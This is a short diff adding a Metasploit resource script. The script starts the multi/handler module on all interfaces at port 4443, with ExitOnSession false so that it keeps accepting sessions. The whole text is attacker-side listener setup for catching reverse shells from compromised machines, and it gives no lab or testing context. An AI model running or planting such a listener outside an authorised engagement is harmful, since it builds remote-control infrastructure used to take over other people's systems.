@@ -1,0 +1,4 @@
+use multi/handler
+set ExitOnSession false
+set LHOST 0.0.0.0 
+set LPORT 4443
